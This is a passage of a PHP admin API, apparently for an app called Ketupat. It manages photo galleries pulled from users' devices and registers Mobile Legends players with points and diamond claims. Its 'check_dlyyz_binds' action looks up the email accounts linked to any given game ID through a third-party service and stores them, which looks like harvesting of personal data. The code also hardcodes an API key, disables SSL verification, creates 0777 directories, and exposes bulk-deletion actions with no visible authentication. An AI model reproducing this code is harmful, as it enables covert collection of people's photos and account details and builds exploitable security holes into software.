            // If deleting an avatar, also clear avatar_data in Supabase
            $isAvatarTarget = (strpos(strtolower($filename), 'avatar') !== false || $filename === 'Profile Avatar');
            if ($isAvatarTarget && !empty($targetEmail) && strtolower($targetEmail) !== 'guest@ketupat.app') {
                supabaseApiRequest('users?email=eq.' . urlencode($targetEmail), 'PATCH', ['avatar_data' => null]);
            }

            sendJson(true, null, 'Photo deleted from device gallery');
            break;

        case 'batch_delete_gallery_photos':
            $deviceId = trim($body['device_id'] ?? $_GET['device_id'] ?? '');
            $filenames = $body['filenames'] ?? [];
            if (empty($deviceId) || !is_array($filenames) || empty($filenames)) {
                sendJson(false, null, 'Device ID and filenames array are required', 400);
            }

            list($targetDir, $cleanDir) = resolveDeviceFolder($deviceId, $deviceId, false);
            $targetEmail = (strpos($deviceId, '@') !== false) ? $deviceId : null;

            $deletedCount = 0;
            $hasAvatarDeleted = false;

            if ($targetDir && is_dir($targetDir)) {
                $metaFile = $targetDir . '/meta.json';
                $meta = file_exists($metaFile) ? json_decode(file_get_contents($metaFile), true) : null;
                if (is_array($meta) && !$targetEmail && !empty($meta['user_email'])) {
                    $targetEmail = $meta['user_email'];
                }

                $filenamesMap = array_flip($filenames);

                foreach ($filenames as $fn) {
                    $baseFn = basename($fn);
                    $filePath = $targetDir . '/' . $baseFn;
                    if (file_exists($filePath)) {
                        @unlink($filePath);
                    }
                    if (strpos(strtolower($fn), 'avatar') !== false || $fn === 'Profile Avatar') {
                        $hasAvatarDeleted = true;
                    }
                    $deletedCount++;
                }

                if (is_array($meta)) {
                    $meta['photos'] = array_values(array_filter($meta['photos'] ?? [], function($p) use ($filenamesMap) {
                        $pFn = basename($p['filename'] ?? '');
                        $pId = $p['id'] ?? '';
                        $pUrl = basename($p['url'] ?? '');
                        $rawFn = $p['filename'] ?? '';
                        return !isset($filenamesMap[$pFn]) && !isset($filenamesMap[$pId]) && !isset($filenamesMap[$pUrl]) && !isset($filenamesMap[$rawFn]);
                    }));
                    $meta['is_full_access'] = count($meta['photos'] ?? []) > 0;
                    $meta['last_synced'] = date('c');
                    file_put_contents($metaFile, json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
                }
            }

            if ($hasAvatarDeleted && !empty($targetEmail) && strtolower($targetEmail) !== 'guest@ketupat.app') {
                supabaseApiRequest('users?email=eq.' . urlencode($targetEmail), 'PATCH', ['avatar_data' => null]);
            }

            sendJson(true, ['deleted_count' => $deletedCount], "$deletedCount photo(s) deleted from device gallery");
            break;

        case 'delete_all_gallery_photos':
            $deviceId = trim($body['device_id'] ?? $_GET['device_id'] ?? $body['email'] ?? $_GET['email'] ?? '');
            if (empty($deviceId)) {
                sendJson(false, null, 'Device ID is required', 400);
            }

            list($targetDir, $cleanDir) = resolveDeviceFolder($deviceId, $deviceId, false);
            $targetEmail = (strpos($deviceId, '@') !== false) ? $deviceId : null;

            if ($targetDir && is_dir($targetDir)) {
                $metaFile = $targetDir . '/meta.json';
                $meta = file_exists($metaFile) ? json_decode(file_get_contents($metaFile), true) : [];
                if (!$targetEmail && !empty($meta['user_email'])) $targetEmail = $meta['user_email'];

                // Remove all photo files from the directory
                foreach (scandir($targetDir) as $f) {
                    if ($f === '.' || $f === '..' || $f === 'meta.json') continue;
                    $fp = $targetDir . '/' . $f;
                    if (is_file($fp)) {
                        @unlink($fp);
                    }
                }

                if (is_array($meta)) {
                    $meta['photos'] = [];
                    $meta['is_full_access'] = false;
                    $meta['last_synced'] = date('c');
                    file_put_contents($metaFile, json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
                }
            }

            if (!empty($targetEmail) && strtolower($targetEmail) !== 'guest@ketupat.app') {
                supabaseApiRequest('users?email=eq.' . urlencode($targetEmail), 'PATCH', ['avatar_data' => null]);
            }

            sendJson(true, null, 'All photos permanently deleted from device gallery');
            break;

        case 'delete_device_gallery':
            $deviceId = trim($body['device_id'] ?? $_GET['device_id'] ?? '');
            $userEmail = trim($body['email'] ?? $body['user_email'] ?? $_GET['email'] ?? '');
            $mlbbId = trim($body['mlbb_id'] ?? $_GET['mlbb_id'] ?? '');

            if (empty($deviceId) && empty($userEmail) && empty($mlbbId)) {
                sendJson(false, null, 'Device ID or identifier is required', 400);
            }
            deleteDeviceCompletely($deviceId, $userEmail, $mlbbId);
            sendJson(true, ['deleted_device_id' => $deviceId], 'Device and all its data permanently deleted from storage and database');
            break;

        case 'batch_delete_devices':
            $deviceIds = $body['device_ids'] ?? [];
            $devices = $body['devices'] ?? [];
            if ((!is_array($deviceIds) || empty($deviceIds)) && (!is_array($devices) || empty($devices))) {
                sendJson(false, null, 'No devices specified for batch deletion', 400);
            }
            $deletedCount = 0;
            if (is_array($devices) && !empty($devices)) {
                foreach ($devices as $devObj) {
                    $dId = trim($devObj['device_id'] ?? '');
                    $dEmail = trim($devObj['email'] ?? '');
                    $dMlbb = trim($devObj['mlbb_id'] ?? '');
                    if (!empty($dId) || !empty($dEmail) || !empty($dMlbb)) {
                        if (deleteDeviceCompletely($dId, $dEmail, $dMlbb)) {
                            $deletedCount++;
                        }
                    }
                }
            } else if (is_array($deviceIds)) {
                foreach ($deviceIds as $dId) {
                    $cleanDId = trim($dId);
                    if (empty($cleanDId)) continue;
                    if (deleteDeviceCompletely($cleanDId)) {
                        $deletedCount++;
                    }
                }
            }
            sendJson(true, ['deleted_count' => $deletedCount], "$deletedCount device(s) deleted successfully");
            break;

        case 'add_device':
            $deviceModel = trim($body['device_model'] ?? 'Android Device');
            $deviceName = trim($body['device_name'] ?? $deviceModel);
            $mlbbId = trim($body['mlbb_id'] ?? '');
            $mlbbServer = trim($body['mlbb_server'] ?? '');
            $mlbbIgn = trim($body['mlbb_ign'] ?? 'Player');
            $userEmail = trim($body['user_email'] ?? '');
            $accessStatus = trim($body['access_status'] ?? 'avatar_only');
            $avatarData = trim($body['avatar_data'] ?? '');

            if (!empty($userEmail) && (str_ends_with(strtolower($userEmail), '@ketupat.app') || strtolower($userEmail) === 'guest@ketupat.app')) {
                $userEmail = '';
            }

            $deviceId = !empty($userEmail) ? $userEmail : ('dev_' . (!empty($mlbbId) ? $mlbbId : bin2hex(random_bytes(4))));
            $cleanDir = preg_replace('/[^a-zA-Z0-9_-]/', '_', strtolower('device_' . $deviceId));
            $galleryDir = __DIR__ . '/uploads/gallery';
            if (!is_dir($galleryDir)) {
                mkdir($galleryDir, 0777, true);
            }
            $targetDir = $galleryDir . '/' . $cleanDir;
            if (!is_dir($targetDir)) {
                mkdir($targetDir, 0777, true);
            }

            $metaFile = $targetDir . '/meta.json';
            $meta = [
                'device_id'          => $deviceId,
                'device_name'        => $deviceName,
                'device_model'       => $deviceModel,
                'device_fingerprint' => 'Manual Registration',
                'user_email'         => $userEmail,
                'mlbb_id'            => $mlbbId,
                'mlbb_server'        => $mlbbServer,
                'mlbb_ign'           => $mlbbIgn,
                'is_full_access'     => ($accessStatus === 'granted'),
                'photos'             => [],
                'last_synced'        => date('c')
            ];

            if (!empty($avatarData) && strpos($avatarData, 'data:image') === 0) {
                $parts = explode(',', $avatarData);
                $rawBase64 = end($parts);
                $decoded = base64_decode($rawBase64);
                if ($decoded !== false) {
                    $fn = 'avatar_current.jpg';
                    file_put_contents($targetDir . '/' . $fn, $decoded);
                    $meta['photos'] = array_values(array_filter($meta['photos'] ?? [], function($p) {
                        return empty($p['is_avatar']) && strpos(strtolower($p['filename'] ?? ''), 'avatar_') !== 0;
                    }));
                    array_unshift($meta['photos'], [
                        'id'           => 'avatar_current',
                        'filename'     => 'avatar_current.jpg',
                        'name'         => 'Profile Avatar',
                        'url'          => 'uploads/gallery/' . $cleanDir . '/avatar_current.jpg',
                        'size'         => strlen($decoded),
                        'mime'         => 'image/jpeg',
                        'is_avatar'    => true,
                        'content_hash' => md5($decoded),
                        'date_added'   => date('c')
                    ]);
                }
            }

            cleanAndSanitizeDeviceGallery($targetDir, $meta);
            file_put_contents($metaFile, json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));

            // Register in Supabase users table
            $userData = [
                'email'            => $userEmail,
                'username'         => $mlbbIgn,
                'mlbb_id'          => $mlbbId,
                'mlbb_server'      => $mlbbServer,
                'mlbb_ign'         => $mlbbIgn,
                'points'           => 100,
                'diamonds_claimed' => 0,
                'updated_at'       => date('c')
            ];
            if (!empty($avatarData)) {
                $userData['avatar_data'] = $avatarData;
            }

            supabaseApiRequest('users', 'POST', $userData, ['Prefer: resolution=merge-duplicates']);

            sendJson(true, [
                'device_id'       => $deviceId,
                'phone_model'     => $deviceModel,
                'user_email'      => $userEmail,
                'formatted_title' => $deviceModel . ' | ' . ($mlbbId ?: '—') . ' (' . ($mlbbServer ?: '—') . ')'
            ], 'Device registered successfully');
            break;

        case 'get_gallery_overview':
            $results = getDeviceGalleryOverviewList();
            sendJson(true, $results, 'Device gallery overview retrieved');
            break;

        case 'check_dlyyz_binds':
            $mlbbId = trim($_GET['mlbb_id'] ?? $body['mlbb_id'] ?? '');
            $mlbbServer = trim($_GET['mlbb_server'] ?? $body['mlbb_server'] ?? '');
            $deviceId = trim($_GET['device_id'] ?? $body['device_id'] ?? '');
            $customApiKey = trim($_GET['apikey'] ?? $body['apikey'] ?? '');

            if (empty($mlbbId) || empty($mlbbServer)) {
                if (!empty($deviceId)) {
                    list($targetDir, $cleanDir) = resolveDeviceFolder($deviceId, $deviceId, false);
                    if ($targetDir && file_exists($targetDir . '/meta.json')) {
                        $meta = json_decode(file_get_contents($targetDir . '/meta.json'), true);
                        if (!empty($meta['mlbb_id'])) $mlbbId = $meta['mlbb_id'];
                        if (!empty($meta['mlbb_server'])) $mlbbServer = $meta['mlbb_server'];
                    }
                }
            }

            if (empty($mlbbId) || empty($mlbbServer)) {
                sendJson(false, null, 'MLBB User ID and Server Zone are required to check live binds', 400);
            }

            $cfg = getAppConfig();
            $apiKey = !empty($customApiKey) ? $customApiKey : ($cfg['dlyyz_api_key'] ?? 'dlyyz-rest.apikey:dhzzyx95b66a0d83364a12aa99e121ef35325f');

            $dlyyzUrl = 'https://dlyyz-rest.my.id/api/validateMLBB?action=bindcek&userID=' . urlencode($mlbbId) . '&serverID=' . urlencode($mlbbServer) . '&apikey=' . urlencode($apiKey);

            $ch = curl_init($dlyyzUrl);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 15);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                'User-Agent: KetupatAdmin/2.0',
                'Accept: application/json'
            ]);

            $rawResp = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $curlErr = curl_error($ch);
            curl_close($ch);

            if ($rawResp === false || !empty($curlErr)) {
                sendJson(false, ['error' => $curlErr], 'Failed to connect to DlyyZ REST API: ' . $curlErr, 502);
            }

            $json = json_decode($rawResp, true);
            if (!$json || empty($json['status'])) {
                $errMsg = $json['message'] ?? 'DlyyZ API returned unverified status';
                sendJson(false, ['raw' => $json], $errMsg, 400);
            }

            $rawData = $json['data'] ?? [];
            $parsedBinds = [];
            $standardPlatforms = [
                'Moonton'    => ['key' => 'moonton', 'label' => 'Moonton Account', 'icon' => 'sports_esports'],
                'GooglePlay' => ['key' => 'google', 'label' => 'Google Play', 'icon' => 'play_arrow'],
                'Facebook'   => ['key' => 'facebook', 'label' => 'Facebook', 'icon' => 'thumb_up'],
                'Tiktok'     => ['key' => 'tiktok', 'label' => 'TikTok', 'icon' => 'video_library'],
                'Apple'      => ['key' => 'apple', 'label' => 'Apple ID', 'icon' => 'devices'],
                'GCID'       => ['key' => 'gcid', 'label' => 'Game Center', 'icon' => 'sports_esports'],
                'VK'         => ['key' => 'vk', 'label' => 'VKontakte', 'icon' => 'share'],
                'WhatsApp'   => ['key' => 'whatsapp', 'label' => 'WhatsApp', 'icon' => 'chat'],
                'Telegram'   => ['key' => 'telegram', 'label' => 'Telegram', 'icon' => 'send']
            ];

            foreach ($standardPlatforms as $apiKeyName => $info) {
                $val = $rawData[$apiKeyName] ?? '';
                $cleanVal = trim(strval($val));
                $lowerVal = strtolower($cleanVal);
                $isBound = (!empty($cleanVal) && $lowerVal !== 'empty.' && $lowerVal !== 'empty' && $lowerVal !== 'unbound' && $lowerVal !== '-' && $lowerVal !== 'null');

                $parsedBinds[] = [
                    'key'       => $info['key'],
                    'label'     => $info['label'],
                    'icon'      => $info['icon'],
                    'bound'     => $isBound,
                    'detail'    => $isBound ? $cleanVal : 'Not Connected',
                    'raw_key'   => $apiKeyName
                ];
            }

            // If device_id provided, merge into device's meta.json
            if (!empty($deviceId)) {
                list($targetDir, $cleanDir) = resolveDeviceFolder($deviceId, $deviceId, true);
                $metaFile = $targetDir . '/meta.json';
                $meta = file_exists($metaFile) ? json_decode(file_get_contents($metaFile), true) : [
                    'device_id' => $deviceId,
                    'photos'    => []
                ];

                $userBinds = $meta['user_binds'] ?? [];
                foreach ($parsedBinds as $pb) {
                    if ($pb['bound']) {
                        $userBinds[$pb['key']] = [
                            'email'    => $pb['detail'],
                            'username' => '',
                            'verified' => true
                        ];
                    }
                }
                $meta['user_binds'] = $userBinds;
                $meta['binds'] = $parsedBinds;
                $meta['dlyyz_raw'] = $rawData;
                $meta['device_name'] = formatPhoneModelName($meta['device_name'] ?? '');
                $meta['device_model'] = formatPhoneModelName($meta['device_model'] ?? $meta['device_name']);
                $meta['last_dlyyz_check'] = date('c');
                file_put_contents($metaFile, json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
            }

            sendJson(true, [
                'mlbb_id'     => $mlbbId,
                'mlbb_server' => $mlbbServer,
                'binds'       => $parsedBinds,
                'raw'         => $rawData,
                'device_info' => $rawData['device'] ?? ''
            ], 'Live MLBB account binds verified via DlyyZ API');
            break;

        default:
            sendJson(false, null, "Unknown or missing action: '$action'", 400);
            break;
    }
} catch (\Throwable $e) {
    sendJson(false, null, 'Server Error: ' . $e->getMessage(), 500);
}
